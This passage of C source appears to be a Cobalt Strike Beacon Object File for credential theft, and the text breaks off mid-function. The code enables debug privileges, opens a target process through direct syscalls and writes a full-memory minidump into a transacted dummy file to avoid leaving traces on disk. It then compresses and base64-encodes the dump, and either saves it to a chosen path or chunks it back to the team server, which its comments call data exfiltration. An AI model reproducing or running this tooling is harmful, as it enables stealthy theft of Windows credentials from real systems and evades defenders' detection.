#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <dbghelp.h>
#include "compressedCredBandit.h"
#include "syscalls.h"
#include "beacon.h"

//Base64 encode
char* base64_encode(const unsigned char *data, size_t input_length, size_t *output_length) {
 
    static char encoding_table[] = {
                                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'
                                };

static int mod_table[] = { 0, 2, 1 };

    *output_length = 4 * ((input_length + 2) / 3);
 
    char *encoded_data = MSVCRT$malloc(*output_length);
    if (encoded_data == NULL) return NULL;
 
    for (int i = 0, j = 0; i < input_length;) {
        
        unsigned int octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        unsigned int octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        unsigned int octet_c = i < input_length ? (unsigned char)data[i++] : 0;
 
        unsigned int triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
 
        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }
 
    for (int i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[*output_length - 1 - i] = '=';
 
    return encoded_data;
}

/*Begin MiniDumpWriteDump reactOS Code*/

static BOOL fetch_process_info(struct dump_context* dc)
{
    ULONG       buf_size = 0x1000;
    NTSTATUS    nts;
    SYSTEM_PROCESS_INFORMATION* pcs_buffer;

    if (!(pcs_buffer = (SYSTEM_PROCESS_INFORMATION*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, buf_size))) return FALSE;
    for (;;)
    {
        nts = NtQuerySystemInformation(SystemProcessInformation,
            pcs_buffer, buf_size, NULL);
        if (nts != 0xC0000004L) break;
        pcs_buffer = (SYSTEM_PROCESS_INFORMATION*)KERNEL32$HeapReAlloc(KERNEL32$GetProcessHeap(), 0, pcs_buffer, buf_size *= 2);
        if (!pcs_buffer) return FALSE;
    }

    if (nts == 0)
    {
        SYSTEM_PROCESS_INFORMATION* spi = pcs_buffer;

        for (;;)
        {
            if (HandleToUlong(spi->UniqueProcessId) == dc->pid)
            {
                dc->num_threads = spi->NumberOfThreads;
                dc->threads = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0,
                    dc->num_threads * sizeof(dc->threads[0]));
                if (!dc->threads) goto failed;
                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pcs_buffer);
                return TRUE;
            }
            if (!spi->NextEntryOffset) break;
            spi = (SYSTEM_PROCESS_INFORMATION*)((char*)spi + spi->NextEntryOffset);
        }
    }
failed:
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pcs_buffer);
    return FALSE;
}

static void writeat(struct dump_context* dc, RVA rva, const void* data, unsigned size)
{
    DWORD       written;

    KERNEL32$SetFilePointer(dc->hFile, rva, NULL, FILE_BEGIN);
    KERNEL32$WriteFile(dc->hFile, data, size, &written, NULL);
}

static void append(struct dump_context* dc, const void* data, unsigned size)
{
    writeat(dc, dc->rva, data, size);
    dc->rva += size;
}

static  unsigned        dump_system_info(struct dump_context* dc)
{
    MINIDUMP_SYSTEM_INFO        mdSysInfo;
    SYSTEM_INFO                 sysInfo;
    OSVERSIONINFOW              osInfo;
    DWORD                       written;
    ULONG                       slen;
    DWORD                       wine_extra = 0;

    const char* build_id = NULL;
    const char* sys_name = NULL;
    const char* release_name = NULL;

    KERNEL32$GetSystemInfo(&sysInfo);
    osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    typedef int(WINAPI* RtlGetNtVersionNumbers)(PDWORD, PDWORD, PDWORD);

    HINSTANCE hinst = LoadLibrary("ntdll.dll");
    DWORD dwMajor, dwMinor, dwBuildNumber;
    RtlGetNtVersionNumbers proc = (RtlGetNtVersionNumbers)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
    proc(&dwMajor, &dwMinor, &dwBuildNumber);
    dwBuildNumber &= 0xffff;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] OS Version: %d.%d.%d\n", dwMajor, dwMinor, dwBuildNumber);
    FreeLibrary(hinst);

    mdSysInfo.ProcessorArchitecture = sysInfo.wProcessorArchitecture;
    mdSysInfo.ProcessorLevel = sysInfo.wProcessorLevel;
    mdSysInfo.ProcessorRevision = sysInfo.wProcessorRevision;
    mdSysInfo.NumberOfProcessors = (UCHAR)sysInfo.dwNumberOfProcessors;
    mdSysInfo.ProductType = VER_NT_WORKSTATION; /* This might need fixing */
    mdSysInfo.MajorVersion = dwMajor;
    mdSysInfo.MinorVersion = dwMinor;
    mdSysInfo.BuildNumber = dwBuildNumber;
    mdSysInfo.PlatformId = 0x2;

    mdSysInfo.CSDVersionRva = dc->rva + sizeof(mdSysInfo) + wine_extra;
    mdSysInfo.Reserved1 = 0;
    mdSysInfo.SuiteMask = VER_SUITE_TERMINAL;
 
    unsigned        i;
    ULONG64         one = 1;

    mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] = 0;
    mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[1] = 0;

    for (i = 0; i < sizeof(mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0]) * 8; i++)
	if (KERNEL32$IsProcessorFeaturePresent(i))
	    mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] |= one << i;
   
    append(dc, &mdSysInfo, sizeof(mdSysInfo));

    const WCHAR* szCSDVersion = L"";
    slen = KERNEL32$lstrlenW(szCSDVersion) * sizeof(WCHAR);
    KERNEL32$WriteFile(dc->hFile, &slen, sizeof(slen), &written, NULL);
    KERNEL32$WriteFile(dc->hFile, szCSDVersion, slen, &written, NULL);
    dc->rva += sizeof(ULONG) + slen;

    return sizeof(mdSysInfo);
}

void minidump_add_memory_block(struct dump_context* dc, ULONG64 base, ULONG size, ULONG rva)
{
    if (!dc->mem)
    {
        dc->alloc_mem = 32;
        dc->mem = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, dc->alloc_mem * sizeof(*dc->mem));
    }
    else if (dc->num_mem >= dc->alloc_mem)
    {
        dc->alloc_mem *= 2;
        dc->mem = KERNEL32$HeapReAlloc(KERNEL32$GetProcessHeap(), 0, dc->mem,
            dc->alloc_mem * sizeof(*dc->mem));
    }
    if (dc->mem)
    {
        dc->mem[dc->num_mem].base = base;
        dc->mem[dc->num_mem].size = size;
        dc->mem[dc->num_mem].rva = rva;
        dc->num_mem++;
    }
    else dc->num_mem = dc->alloc_mem = 0;
}


static void minidump_add_memory64_block(struct dump_context* dc, ULONG64 base, ULONG64 size)
{
    if (!dc->mem64)
    {
        dc->alloc_mem64 = 32;
        dc->mem64 = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, dc->alloc_mem64 * sizeof(*dc->mem64));
    }
    else if (dc->num_mem64 >= dc->alloc_mem64)
    {
        dc->alloc_mem64 *= 2;
        dc->mem64 = KERNEL32$HeapReAlloc(KERNEL32$GetProcessHeap(), 0, dc->mem64,
            dc->alloc_mem64 * sizeof(*dc->mem64));
    }
    if (dc->mem64)
    {
        dc->mem64[dc->num_mem64].base = base;
        dc->mem64[dc->num_mem64].size = size;
        dc->num_mem64++;
    }
    else dc->num_mem64 = dc->alloc_mem64 = 0;
}

static void fetch_memory64_info(struct dump_context* dc)
{
    ULONG_PTR                   addr;
    MEMORY_BASIC_INFORMATION    mbi;

    addr = 0;
    while (KERNEL32$VirtualQueryEx(dc->handle, (LPCVOID)addr, &mbi, sizeof(mbi)) != 0)
    {
        /* Memory regions with state MEM_COMMIT will be added to the dump */
        if (mbi.State == MEM_COMMIT)
        {
            minidump_add_memory64_block(dc, (ULONG_PTR)mbi.BaseAddress, mbi.RegionSize);
        }

        if ((addr + mbi.RegionSize) < addr)
            break;

        addr = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
    }
}

static inline BOOL read_process_memory(HANDLE process, UINT64 addr, void* buf, size_t size)
{
    SIZE_T read = 0;
    NTSTATUS res = NtReadVirtualMemory(process, (PVOID*)addr, buf, size, &read);
    return !res;
}

static unsigned         dump_memory64_info(struct dump_context* dc)
{
    MINIDUMP_MEMORY64_LIST          mdMem64List;
    MINIDUMP_MEMORY_DESCRIPTOR64    mdMem64;
    DWORD                           written;
    unsigned                        i, len, sz;
    RVA                             rva_base;
    char                            tmp[1024];
    ULONG64                         pos;
    LARGE_INTEGER                   filepos;

    sz = sizeof(mdMem64List.NumberOfMemoryRanges) +
        sizeof(mdMem64List.BaseRva) +
        dc->num_mem64 * sizeof(mdMem64);

    mdMem64List.NumberOfMemoryRanges = dc->num_mem64;
    mdMem64List.BaseRva = dc->rva + sz;

    append(dc, &mdMem64List.NumberOfMemoryRanges,
        sizeof(mdMem64List.NumberOfMemoryRanges));
    append(dc, &mdMem64List.BaseRva,
        sizeof(mdMem64List.BaseRva));

    rva_base = dc->rva;
    dc->rva += dc->num_mem64 * sizeof(mdMem64);

    /* dc->rva is not updated past this point. The end of the dump
     * is just the full memory data. */
    filepos.QuadPart = dc->rva;
    for (i = 0; i < dc->num_mem64; i++)
    {
        mdMem64.StartOfMemoryRange = dc->mem64[i].base;
        mdMem64.DataSize = dc->mem64[i].size;
        KERNEL32$SetFilePointerEx(dc->hFile, filepos, NULL, FILE_BEGIN);
        for (pos = 0; pos < dc->mem64[i].size; pos += sizeof(tmp))
        {
            len = (unsigned)(min(dc->mem64[i].size - pos, sizeof(tmp)));
            if (read_process_memory(dc->handle, dc->mem64[i].base + pos, tmp, len))
                KERNEL32$WriteFile(dc->hFile, tmp, len, &written, NULL);
        }
        filepos.QuadPart += mdMem64.DataSize;
        writeat(dc, rva_base + i * sizeof(mdMem64), &mdMem64, sizeof(mdMem64));
    }

    return sz;
}

static void fetch_module_versioninfo(LPCWSTR filename, VS_FIXEDFILEINFO* ffi)
{
    DWORD       handle;
    DWORD       sz;
    static const WCHAR backslashW[] = { '\\', '\0' };

    MSVCRT$memset(ffi, 0, sizeof(*ffi));
    if ((sz = VERSION$GetFileVersionInfoSizeW(filename, &handle)))
    {
        void* info = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, sz);
        if (info && VERSION$GetFileVersionInfoW(filename, handle, sz, info))
        {
            VS_FIXEDFILEINFO* ptr;
            UINT    len;

            if (VERSION$VerQueryValueW(info, backslashW, (LPVOID*)&ptr, &len))
                MSVCRT$memcpy(ffi, ptr, min(len, sizeof(*ffi)));
        }
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, info);
    }
}

static  unsigned        dump_modules(struct dump_context* dc, BOOL dump_elf)
{
    MINIDUMP_MODULE             mdModule;
    MINIDUMP_MODULE_LIST        mdModuleList;
    char                        tmp[1024];
    MINIDUMP_STRING* ms = (MINIDUMP_STRING*)tmp;
    ULONG                       i, nmod;
    RVA                         rva_base;
    DWORD                       flags_out;
    unsigned                    sz;

    for (i = nmod = 0; i < dc->num_modules; i++)
    {
        if ((dc->modules[i].is_elf && dump_elf) ||
            (!dc->modules[i].is_elf && !dump_elf))
            nmod++;
    }

    mdModuleList.NumberOfModules = 0;
    rva_base = dc->rva;
    dc->rva += sz = sizeof(mdModuleList.NumberOfModules) + sizeof(mdModule) * nmod;

    for (i = 0; i < dc->num_modules; i++)
    {
        if ((dc->modules[i].is_elf && !dump_elf) ||
            (!dc->modules[i].is_elf && dump_elf))
            continue;

        flags_out = ModuleWriteModule | ModuleWriteMiscRecord | ModuleWriteCvRecord;
        if (dc->type & MiniDumpWithDataSegs)
            flags_out |= ModuleWriteDataSeg;
        if (dc->type & MiniDumpWithProcessThreadData)
            flags_out |= ModuleWriteTlsData;
        if (dc->type & MiniDumpWithCodeSegs)
            flags_out |= ModuleWriteCodeSegs;

        ms->Length = (KERNEL32$lstrlenW(dc->modules[i].name) + 1) * sizeof(WCHAR);

        KERNEL32$lstrcpyW(ms->Buffer, dc->modules[i].name);

        if (flags_out & ModuleWriteModule)
        {
            mdModule.BaseOfImage = dc->modules[i].base;
            mdModule.SizeOfImage = dc->modules[i].size;
            mdModule.CheckSum = dc->modules[i].checksum;
            mdModule.TimeDateStamp = dc->modules[i].timestamp;
            mdModule.ModuleNameRva = dc->rva;
            ms->Length -= sizeof(WCHAR);
            append(dc, ms, sizeof(ULONG) + ms->Length + sizeof(WCHAR));
            fetch_module_versioninfo(ms->Buffer, &mdModule.VersionInfo);
            mdModule.CvRecord.DataSize = 0; 
            mdModule.CvRecord.Rva = 0; 
            mdModule.MiscRecord.DataSize = 0;
            mdModule.MiscRecord.Rva = 0; 
            mdModule.Reserved0 = 0;
            mdModule.Reserved1 = 0; 
            writeat(dc,
                rva_base + sizeof(mdModuleList.NumberOfModules) +
                mdModuleList.NumberOfModules++ * sizeof(mdModule),
                &mdModule, sizeof(mdModule));
        }
    }
    writeat(dc, rva_base, &mdModuleList.NumberOfModules,
        sizeof(mdModuleList.NumberOfModules));

    return sz;
}

BOOL validate_addr64(DWORD64 addr)
{
    if (sizeof(void*) == sizeof(int) && (addr >> 32))
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    return TRUE;
}

BOOL pe_load_nt_header(HANDLE hProc, DWORD64 base, IMAGE_NT_HEADERS* nth)
{
    IMAGE_DOS_HEADER    dos;

    NTSTATUS res = NtReadVirtualMemory(hProc, (PVOID*)(DWORD_PTR)base, &dos, sizeof(dos), NULL);

    NTSTATUS res2 = NtReadVirtualMemory(hProc, (PVOID*)(DWORD_PTR)(base + dos.e_lfanew), nth, sizeof(*nth), NULL);

    return  !res && dos.e_magic == IMAGE_DOS_SIGNATURE && !res2 && nth->Signature == IMAGE_NT_SIGNATURE;
}

static BOOL add_module(struct dump_context* dc, const WCHAR* name,
    DWORD64 base, DWORD size, DWORD timestamp, DWORD checksum,
    BOOL is_elf)
{
    if (!dc->modules)
    {
        dc->alloc_modules = 32;
        dc->modules = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0,
            dc->alloc_modules * sizeof(*dc->modules));
    }
    else if (dc->num_modules >= dc->alloc_modules)
    {
        dc->alloc_modules *= 2;
        dc->modules = KERNEL32$HeapReAlloc(KERNEL32$GetProcessHeap(), 0, dc->modules,
            dc->alloc_modules * sizeof(*dc->modules));
    }
    if (!dc->modules)
    {
        dc->alloc_modules = dc->num_modules = 0;
        return FALSE;
    }

    PSAPI$GetModuleFileNameExW(dc->handle, (HMODULE)(DWORD_PTR)base, dc->modules[dc->num_modules].name, ARRAY_SIZE(dc->modules[dc->num_modules].name));

    dc->modules[dc->num_modules].base = base;
    dc->modules[dc->num_modules].size = size;
    dc->modules[dc->num_modules].timestamp = timestamp;
    dc->modules[dc->num_modules].checksum = checksum;
    dc->modules[dc->num_modules].is_elf = is_elf;
    dc->num_modules++;

    return TRUE;
}


static BOOL WINAPI fetch_pe_module_info_cb(PCWSTR name, DWORD64 base, ULONG size,
    PVOID user)
{
    struct dump_context* dc = user;
    IMAGE_NT_HEADERS            nth;

    if (!validate_addr64(base)) return FALSE;

    if (pe_load_nt_header(dc->handle, base, &nth))
        add_module(user, name, base, size,
            nth.FileHeader.TimeDateStamp, nth.OptionalHeader.CheckSum,
            FALSE);

    return TRUE;
}


static void fetch_modules_info(struct dump_context* dc)
{
    DBGHELP$EnumerateLoadedModulesW64(dc->handle, fetch_pe_module_info_cb, dc);
}

BOOL MiniDumpWriteDumpA(HANDLE hProcess, DWORD pid, HANDLE hFile)
{
    static const MINIDUMP_DIRECTORY emptyDir = { UnusedStream, {0, 0} };
    MINIDUMP_HEADER     mdHead;
    MINIDUMP_DIRECTORY  mdDir;
    DWORD               i, nStreams, idx_stream;
    struct dump_context dc;
    BOOL                sym_initialized = FALSE;

    const DWORD Flags = MiniDumpWithFullMemory |
        MiniDumpWithFullMemoryInfo |
        MiniDumpWithUnloadedModules;

    MINIDUMP_TYPE DumpType = (MINIDUMP_TYPE)Flags;

    if (!(sym_initialized = DBGHELP$SymInitializeW(hProcess, NULL, TRUE)))
    {
        DWORD err = KERNEL32$GetLastError();
        return FALSE;
    }

    dc.hFile = hFile;
    dc.pid = pid;
    dc.handle = hProcess;
    dc.modules = NULL;
    dc.num_modules = 0;
    dc.alloc_modules = 0;
    dc.threads = NULL;
    dc.num_threads = 0;
    dc.type = DumpType;
    dc.mem = NULL;
    dc.num_mem = 0;
    dc.alloc_mem = 0;
    dc.mem64 = NULL;
    dc.num_mem64 = 0;
    dc.alloc_mem64 = 0;
    dc.rva = 0;

    if (!fetch_process_info(&dc)) return FALSE;

    fetch_modules_info(&dc);

    nStreams = 3;
    nStreams = (nStreams + 3) & ~3;

    // Write Header
    mdHead.Signature = MINIDUMP_SIGNATURE;
    mdHead.Version = MINIDUMP_VERSION;
    mdHead.NumberOfStreams = nStreams;
    mdHead.CheckSum = 0;
    mdHead.StreamDirectoryRva = sizeof(mdHead);
    //mdHead.TimeDateStamp = time(NULL);
    mdHead.Flags = DumpType;
    append(&dc, &mdHead, sizeof(mdHead));

    // Write Stream Directories 
    dc.rva += nStreams * sizeof(mdDir);
    idx_stream = 0;

    // Write Data Stream Directories 
    //

    // Must be first in MiniDump
    mdDir.StreamType = SystemInfoStream;
    mdDir.Location.Rva = dc.rva;
    mdDir.Location.DataSize = dump_system_info(&dc);
    writeat(&dc, mdHead.StreamDirectoryRva + idx_stream++ * sizeof(mdDir),
        &mdDir, sizeof(mdDir));

    mdDir.StreamType = ModuleListStream;
    mdDir.Location.Rva = dc.rva;
    mdDir.Location.DataSize = dump_modules(&dc, FALSE);
    writeat(&dc, mdHead.StreamDirectoryRva + idx_stream++ * sizeof(mdDir),
        &mdDir, sizeof(mdDir));

    fetch_memory64_info(&dc);

    mdDir.StreamType = Memory64ListStream;
    mdDir.Location.Rva = dc.rva;
    mdDir.Location.DataSize = dump_memory64_info(&dc);
    writeat(&dc, mdHead.StreamDirectoryRva + idx_stream++ * sizeof(mdDir),
        &mdDir, sizeof(mdDir));

    // fill the remaining directory entries with 0's (unused stream types)
    // NOTE: this should always come last in the dump!
    for (i = idx_stream; i < nStreams; i++)
        writeat(&dc, mdHead.StreamDirectoryRva + i * sizeof(emptyDir), &emptyDir, sizeof(emptyDir));

    if (sym_initialized)
        DBGHELP$SymCleanup(hProcess);

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, dc.mem);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, dc.mem64);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, dc.modules);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, dc.threads);

    return TRUE;
}

void EnableDebugPriv()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    NTSTATUS status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);

    if(status != STATUS_SUCCESS){
    	BeaconPrintf(CALLBACK_ERROR, "Failed to open process token\n");
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    LPCWSTR lpwPriv = L"SeDebugPrivilege";
	if (!ADVAPI32$LookupPrivilegeValueW(NULL, lpwPriv, &tkp.Privileges[0].Luid)) {
		NtClose(hToken);
	}

    status = NtAdjustPrivilegesToken(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

    if (status != STATUS_SUCCESS){
    	BeaconPrintf(CALLBACK_ERROR, "Failed to adjust process token");
    }

    NtClose(hToken);
}

HANDLE GetProcessHandle(DWORD dwPid) {

    NTSTATUS status;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    CLIENT_ID uPid = { 0 };

    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
    uPid.UniqueThread = (HANDLE)0;

    status = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &ObjectAttributes, &uPid);
    if (hProcess == NULL) {
        return NULL;
    }

    return hProcess;
}
/*End MiniDumpWriteDump reactOS Code*/

//Entry Function
void go(char* args, int length) {
	
	//Beacon parser stuff
	datap  parser;
	DWORD PID;
	char* outputFile;
	BeaconDataParse(&parser, args, length);
	PID = BeaconDataInt(&parser);
	outputFile = BeaconDataExtract(&parser, NULL);
	
	//Declare variables
	PBYTE returnData = NULL;
	HANDLE hProc = INVALID_HANDLE_VALUE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	HANDLE tFile = INVALID_HANDLE_VALUE;
	HANDLE mapFile = INVALID_HANDLE_VALUE;
	BOOL success = 0;
	NTSTATUS status = 0;
	SIZE_T ViewSize = 0;
	OBJECT_ATTRIBUTES objAttr;
	CLIENT_ID cID;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	cID.UniqueProcess = (PVOID)PID;
	cID.UniqueThread = 0;
	IO_STATUS_BLOCK IoStatusBlock;
	
        //Get pointer to RtlSetCurrentTransaction and RtlInitUnicodeString        
	_RtlSetCurrentTransaction RtlSetCurrentTransaction = (_RtlSetCurrentTransaction) GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlSetCurrentTransaction");	
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString) GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

	//Enable Debug Privs
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting To Enable Debug Privs\n");
	EnableDebugPriv();
	
	//Open target process and if successful attempt to dump memory
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting To Dump Proccess %d\n", PID);
	status = NtOpenProcess(&hProc, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &cID);

	if (status != 0) {

		BeaconPrintf(CALLBACK_ERROR, "[-] NtOpenProcess failed with status %lx\n", status);
	}
	else {

		BeaconPrintf(CALLBACK_OUTPUT, "[+] NtOpenProcess returned HANDLE 0x%p\n", hProc);
	

	//Create Transaction
	status = NtCreateTransaction(&tFile, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL);

	if (status != 0) {

		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtCreateTransaction failed with status %lx\n", status);
	}
	else {

		BeaconPrintf(CALLBACK_OUTPUT, "[+] NtCreateTransaction returned HANDLE 0x%p\n", tFile);
	}

	//Set Current Transaction
	status = RtlSetCurrentTransaction(tFile);

	if (status != 1) {

		BeaconPrintf(CALLBACK_OUTPUT, "[-] RtlSetCurrentTransaction failed with status %lx\n", status);
	}
	else {

		BeaconPrintf(CALLBACK_OUTPUT, "[+] RtlSetCurrentTransaction successfully set\n");
	}
	
	//Set some arbitrary file path
	PCWSTR filePath = L"\\??\\C:\\SomeBogusFile.txt";
	UNICODE_STRING unicodeString;
	RtlInitUnicodeString(&unicodeString, filePath);

	InitializeObjectAttributes(&objAttr, &unicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);

	const int allocSize = 0;
	LARGE_INTEGER largeInteger;
	largeInteger.QuadPart = allocSize;
	
	//Create File
	status = NtCreateFile(&hFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE, &objAttr, &IoStatusBlock, &largeInteger, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE | FILE_SHARE_READ, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (status != 0) {

		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtCreateFile failed with status %lx\n", status);
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] NtCreateFile returned HANDLE 0x%p\n", hFile);
	}

	//Set Current Transaction
	status = RtlSetCurrentTransaction(0);

	if (status != 1) {

		BeaconPrintf(CALLBACK_OUTPUT, "[-] RtlSetCurrentTransaction failed with status %lx\n", status);
	}
	else {

		BeaconPrintf(CALLBACK_OUTPUT, "[+] RtlSetCurrentTransaction successfully set\n", status);
	}
	
	//Create MiniDump using ReactOS minidumpwritedump code
	success = MiniDumpWriteDumpA(hProc, PID, hFile);
		
	if (success = 0) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] MiniDump failed.  GetLastError = (%ld)\n", KERNEL32$GetLastError());
	}
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] MiniDump written to memory\n");
	}
	
	//Get size of MiniDump
	LARGE_INTEGER fs;
	success = KERNEL32$GetFileSizeEx(hFile, &fs);
	unsigned long long fileSize = fs.QuadPart;
	BeaconPrintf(CALLBACK_OUTPUT, "[+] MiniDump Size In Bytes = %d\n", fileSize);

	//Create mapped file and read dump contents into buffer
	status = NtCreateSection(&mapFile, SECTION_MAP_READ, 0, &largeInteger, PAGE_READONLY, SEC_COMMIT, hFile);

	if (status != 0) {

		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtCreateSection failed with status %lx\n", status);
	}
	else {
	
		BeaconPrintf(CALLBACK_OUTPUT, "[+] NtCreateSection created\n");
	}

	status = NtMapViewOfSection(mapFile, (HANDLE)-1, &returnData, 0, 0, 0, &ViewSize, ViewUnmap, 0, PAGE_READONLY);

	if (status != 0) {

		BeaconPrintf(CALLBACK_OUTPUT, "[-] NtMapViewOfSection failed with status %lx\n", status);
	}
	else {

		BeaconPrintf(CALLBACK_OUTPUT, "[+] NtMapViewOfSection successful\n");

	}
	
	/*Note: At this point returnData holds our memory dump -> You could choose to encrypt it, compress it, write it to disk somwhere, whatever.  You do you*/

	// Compress it!
	LoadLibrary("cabinet.dll");
	COMPRESSOR_HANDLE Compressor = NULL;
	PBYTE CompressedBuffer = NULL;
	SIZE_T CompressedDataSize;
	SIZE_T CompressedBufferSize;
	DWORD InputFileSize;

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Compressing data.\n");

	if (!CABINET$CreateCompressor(COMPRESS_ALGORITHM_MSZIP, NULL, &Compressor))
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create compressor.\n");
		return;
	}

	if (!CABINET$Compress(Compressor, returnData, fileSize, NULL, 0, &CompressedBufferSize))
	{
		DWORD ErrorCode = KERNEL32$GetLastError();

        if (ErrorCode != ERROR_INSUFFICIENT_BUFFER)
        {
			BeaconPrintf(CALLBACK_OUTPUT, "[-] Compress  failed with GetLastError = (%ld)\n", ErrorCode);
			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get compressed buffer size.\n");
			return;
        }
            
        CompressedBuffer = (PBYTE)MSVCRT$malloc(CompressedBufferSize);
        if (!CompressedBuffer)
        {
			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate buffer.\n");
            return;
        }
	}


	if (!CABINET$Compress(Compressor, returnData, fileSize, CompressedBuffer, CompressedBufferSize, &CompressedDataSize))
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to compress the data\n");
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Compressed Size: %d\n", CompressedDataSize);

	//Base64 our MiniDump
	size_t outputLength = 0;
	// char* base64returnDataString = base64_encode(returnData, fileSize, &outputLength);
	char* base64returnDataString = base64_encode(CompressedBuffer, CompressedDataSize, &outputLength);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Base64 Length In Bytes = %d\n", outputLength);

	void* baseAddress = (void*)base64returnDataString;

	/*Note: At this point base64returnDataString also holds our now base64 memory dump and I have added code to optionally write to disk -> Again, like mentioned above you could do whatever after this, for example skip the BeaconPrintf POC and send out via different comms method*/
	
	if (MSVCRT$strcmp(outputFile,"")  != 0) {
	
	//Create a file on disk and write our buffer to path operator chose
	DWORD bytesWritten = 0;
	HANDLE writeFile = KERNEL32$CreateFileA(outputFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	success = KERNEL32$WriteFile(writeFile, base64returnDataString, (DWORD)outputLength, &bytesWritten, NULL);
		if (success != 0) {
		
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Writing file was successful\n");
		}
		else
		{
			BeaconPrintf(CALLBACK_OUTPUT, "[-] WriteFile failed with GetLastError = (%ld)\n", KERNEL32$GetLastError());
		}
		
		//close handle
		status = NtClose(writeFile);
	}
	else
	{
	
	//Chunk the data and send it back to team server -> Probably a beter way ¯\_(ツ)_/¯
    	size_t size = 1021;
	char* toSend = (char*)intAlloc(size);
    	ULONG CurLen = 0;
    	ULONG ChkLen = 1020;
	MSVCRT$memset(toSend, 0, size);
	
	//If larger than 100 MB we are going to split in half plus slow our roll a bit to help make sure we get the entire dump back and our beacon doesn't die 
	//Note: If you wanted to be really safe, you could split the data into 100 MB chunks.  This way if your dump file is for example 400MB you can manage it easier with less risk of losing your beacon.
	if (outputLength > 100000000) {
	
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Dump larger than 100 MB. Going to chunk and start sending half\n");
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Then sleep for 3 minutes so CS can catch up and send last half...\n");
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Data Exfiltration Will Take Several Minutes So Be Patient...\n");
		
		//Check if outputLength is odd or even and if odd make even to easily split in half
		BOOL isOdd = 0;
		if ( outputLength%2 != 0 ) {
		
